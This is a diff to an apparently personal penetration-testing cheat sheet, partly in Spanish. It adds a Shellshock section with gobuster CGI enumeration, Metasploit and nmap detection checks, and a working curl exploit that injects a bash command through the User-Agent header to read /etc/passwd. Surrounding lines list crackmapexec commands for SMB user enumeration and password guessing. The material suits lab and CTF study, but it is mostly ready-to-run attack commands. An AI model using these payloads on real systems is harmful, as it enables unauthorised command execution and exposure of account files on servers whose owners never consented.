@@ -407,6 +407,22 @@ crackmapexec smb [IP] -u '' -p '' --user --> enumerar usuarios
 crackmapexec smb [IP] -u [user] -p [passwords] -- probar usarios y contraseñas
 smbshares.sh
 
+
+SHELLSHOCK VULN
+................
+
+search
+    gobuster dir -u http://192.88.83.3/ -w /path/to/wordlist -x sh,cgi
+
+check
+    (metasploit) auxiliary/scanner/http/apache_mod_cgi_bash_env
+    nmap --script http-shellshock --script-args "URL" [IP]
+
+exploit
+    curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \ http://localhost:8080/cgi-bin/vulnerable
+    (burpsuite) https://medium.com/@yashpawar1199/exploiting-the-shellshock-cve-2014-6271-vulnerability-043514bea7b8
+
+
 RESPONDER
 ..........
 
